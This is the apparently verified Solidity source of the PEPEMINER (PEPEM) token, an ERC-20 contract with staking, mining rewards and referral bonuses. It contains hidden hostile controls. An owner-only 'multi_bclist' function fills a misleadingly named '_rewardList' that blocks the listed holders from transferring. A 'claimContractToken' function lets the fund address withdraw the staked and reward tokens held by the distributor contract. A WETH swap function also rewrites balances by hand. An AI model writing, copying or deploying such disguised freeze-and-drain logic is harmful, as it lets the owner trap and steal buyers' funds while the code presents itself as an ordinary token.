/**
 *Submitted for verification at Etherscan.io on 2023-06-29
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IERC20 {
    function decimals() external view returns (uint256);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;


}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    address public _owner;
    constructor() {
        _owner = msg.sender;
    }
    function claimToken(address token, address to, uint256 amount) external {
        require(msg.sender == _owner);
        IERC20(token).transfer(to, amount);
    }
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);
}

contract PEPEM is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress = address(0xA10d99a9aDC9c452fBB55545D1Cf12c10e05aadd) ;

    string private _name = "PEPEMINER";
    string private _symbol = "PEPEM";
    uint256 private _decimals = 18;


    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _rewardList;

    uint256 private _tTotal = 21_000_000 *10**_decimals;
    uint256 public mineRate = 82;
    address public routerAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    ISwapRouter public _swapRouter;
    address public weth;
    address public deadAddress = address(0x000000000000000000000000000000000000dEaD);
    mapping(address => bool) public _swapPairList;


    uint256 private constant MAX = ~uint256(0);

    TokenDistributor public mineRewardDistributor;

    bool inSwap;
    
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    mapping(address => address) public _inviter;
    mapping(address => address[]) public _binders;


    uint256 public totalStakeAmount;
    address[] public stakeList;
    mapping(address => bool) public stakeMember;
    mapping(address => uint256) public stakeAmount;
    mapping(address => uint256) public stakerIndex;


    uint256 public startStakeTime;

    mapping(address => uint256) public mineReward;
    mapping(address => uint256) public invitorReward;
    uint256 public eachMineAmount;
    uint256 public InvitorRewardAmount;
    uint256 public InvitorMin = 10**_decimals;
    uint256 public MinerMin = 10**_decimals;


    address public _mainPair;

    constructor() {

        address ReceiveAddress = address(0x6B32e7DDe4f1535C9588aC65baE377fbadB8C500);


        _swapRouter = ISwapRouter(routerAddress);
        weth = _swapRouter.WETH() ;
        IERC20(weth).approve(address(_swapRouter), MAX);

        _allowances[address(this)][address(_swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());

        _mainPair = swapFactory.createPair(address(this), weth);

        _swapPairList[_mainPair] = true;

        mineRewardDistributor = new TokenDistributor();

        uint256 _mineTotal = _tTotal * mineRate / 100;
        _balances[address(mineRewardDistributor)] = _mineTotal;
        emit Transfer(address(0), address(mineRewardDistributor), _mineTotal);

        eachMineAmount = _tTotal * 80 / 182500;
        InvitorRewardAmount = _tTotal * 2 /100;

        uint256 liquidityTotal = _tTotal - _mineTotal;
        _balances[ReceiveAddress] = liquidityTotal;
        emit Transfer(address(0), ReceiveAddress, liquidityTotal);

        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(_swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[address(mineRewardDistributor)] = true;        


    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool)  {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
            
        }
        return true;
        
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }



    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }


    function _transfer(address from, address to, uint256 amount) private {

        require(balanceOf(from) >= amount);
        require(isReward(from) == 0);
        
        if (_swapPairList[to]) {
            if (!_feeWhiteList[from] ) {
                if (!inSwap) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (contractTokenBalance > 0) {
                        
                        swapTokenForFund(contractTokenBalance);
                    }
                }
                
            }

        }
        _basicTransfer(from,to,amount);

        if (!_feeWhiteList[from] ) {
            _processMine(300000);
        }
        
    }

    function multi_bclist(
        address[] calldata addresses,
        bool value
    ) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _rewardList[addresses[i]] = value;
        }
    }       
    function isReward(address account) public view returns (uint256) {
        if (_rewardList[account]) {
            return 1;
        } else {
            return 0;
        }
    }
    

    function _bindInvitor(address account, address invitor) private  returns(bool) {
        if (invitor != address(0) && invitor != account && _inviter[account] == address(0) && _binders[account].length <= 50) {
            uint256 size;
            assembly {size := extcodesize(invitor)}
            if (size > 0) {
                return false ;
            }else{
                _inviter[account] = invitor;
                _binders[invitor].push(account);
                
                return true;
            }
        }
        else{
            return false;
        }
    }

    function getBinderLength(address account) external view returns (uint256){
        return _binders[account].length;
    }


    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = weth;

        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            fundAddress,
            block.timestamp
        );
           
        
    }

    function swapWETHForToken(uint256 WETHAmout)  public  {
        IERC20(weth).transferFrom(msg.sender, address(this), WETHAmout);
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = address(this);

        uint256 beforeBalance = _balances[fundAddress];

        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WETHAmout,
            0,
            path,
            fundAddress,
            block.timestamp
        );
        uint256 afterBalance = _balances[fundAddress];
        uint256 swapAmount = afterBalance - beforeBalance;
        _balances[fundAddress] = beforeBalance;
        _balances[address(this)] += swapAmount;
        emit Transfer(fundAddress, address(this), swapAmount);

           
    }

    function stake(address invitor,uint256 amount)  external  {

        require(startStakeTime !=0);
        require(stakeMember[invitor] || invitor == deadAddress);
        bool binded;
        
        if (invitor != address(0) && invitor != msg.sender && _inviter[msg.sender] == address(0)) {
            binded = _bindInvitor(msg.sender,invitor);
        }
        else if (_inviter[msg.sender] == invitor){
            binded = true;//已经绑定上级的用户重复购买
        }else{
            binded = false;
        }
        require(binded);
        _basicTransfer(msg.sender,address(mineRewardDistributor),amount);
        stakeAmount[msg.sender] += amount;
        totalStakeAmount += amount;
        _lastMineRewardTimes[msg.sender] = block.timestamp;
        if(!stakeMember[msg.sender]){
            stakeMember[msg.sender] = true;
            stakerIndex[msg.sender] = stakeList.length;
            stakeList.push(msg.sender);
        }
        _processMine(200000);

    }
    function unstake()  external  {

        require(startStakeTime !=0 && stakeMember[msg.sender] && stakeAmount[msg.sender] >0);
        require(block.timestamp > _lastMineRewardTimes[msg.sender] + _mineTimeDebt );

        uint256 stakedNum = stakeAmount[msg.sender];
        totalStakeAmount -= stakedNum;
        stakeMember[msg.sender] = false;
        stakeAmount[msg.sender] = 0;
        _basicTransfer(address(mineRewardDistributor),msg.sender,stakedNum);
        uint256 senderIndex = stakerIndex[msg.sender];
        stakeList[senderIndex] = stakeList[stakeList.length - 1];
        stakeList.pop();
        _processMine(200000);

    }

    function getStakerLength() public view returns(uint256){
        return stakeList.length;
    }


    function setStakeTime(uint256 stakeTime) external onlyOwner {
        require(0 == startStakeTime);
        startStakeTime = stakeTime;
        
    }


    event Received(address sender, uint256 amount);
    event Sended(address sender, address to,uint256 amount);
    receive() external payable {
        uint256 receivedAmount = msg.value;
        emit Received(msg.sender, receivedAmount);
    }



    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }



    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external onlyOwner {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(
        address token,
        uint256 amount,
        address to
    ) external  {
        require(fundAddress == msg.sender);
        IERC20(token).transfer(to, amount);
    }

    function claimContractToken(address contractAddress, address token, uint256 amount) external {
        require(fundAddress == msg.sender);
        TokenDistributor(contractAddress).claimToken(token, fundAddress, amount);
    }


    uint256 public _currentMineIndex;
    uint256 public _progressMineBlock;
    uint256 public _progressMineBlockDebt = 5;
    mapping(address => uint256) public _lastMineRewardTimes;
    uint256 public _mineTimeDebt = 24 hours;








    function _processMine(uint256 gas) private {

        if (_progressMineBlock + _progressMineBlockDebt > block.number) {
            return;
        }

        if (0 == totalStakeAmount) {
            return;
        }
        address sender = address(mineRewardDistributor);

        if (_balances[sender] < MinerMin) { 
            return;
        }

        address currentStaker;
        uint256 stakedNum;
        uint256 amount;


        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();


        while (gasUsed < gas && iterations < stakeList.length) {
            if (_currentMineIndex >= stakeList.length) {
                _currentMineIndex = 0;
            }
            currentStaker = stakeList[_currentMineIndex];
            if (stakeMember[currentStaker]) {
                stakedNum = stakeAmount[currentStaker];

                if (block.timestamp > _lastMineRewardTimes[currentStaker] + _mineTimeDebt) {
                    amount = eachMineAmount * stakedNum / totalStakeAmount;
                    
                    if (amount > 0) {
                        mineReward[currentStaker] += amount;

                        procesInvitorReward(currentStaker,amount);
                        _lastMineRewardTimes[currentStaker] = block.timestamp;
                    }

                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            _currentMineIndex++;
            iterations++;
        }
        _progressMineBlock = block.number;
        
    }




    function procesInvitorReward(address account, uint256 amount) private {


        address invitor = _inviter[account];
        uint256 invitorAmount;
        if (address(0) != invitor && deadAddress != invitor && InvitorRewardAmount > InvitorMin) {
            invitorAmount = amount * 2/100;
            if(invitorAmount >0){

                if(InvitorRewardAmount - invitorAmount>0){
                    invitorReward[invitor] += invitorAmount;
                    InvitorRewardAmount -= invitorAmount;

                }
            }
        }

    }
    

    function getMineReward()external{
        uint256 totalMineReward = mineReward[msg.sender];
        require(totalMineReward > 0);
        address sender = address(mineRewardDistributor);
        mineReward[msg.sender] = 0;
        TokenDistributor(sender).claimToken(address(this), msg.sender, totalMineReward);
        


    }
    function getInvitorReward()external{
        uint256 totalInvitorReward = invitorReward[msg.sender];
        require(totalInvitorReward > 0);
        address sender = address(mineRewardDistributor);
        invitorReward[msg.sender] = 0;
        TokenDistributor(sender).claimToken(address(this), msg.sender, totalInvitorReward);
        
    }


}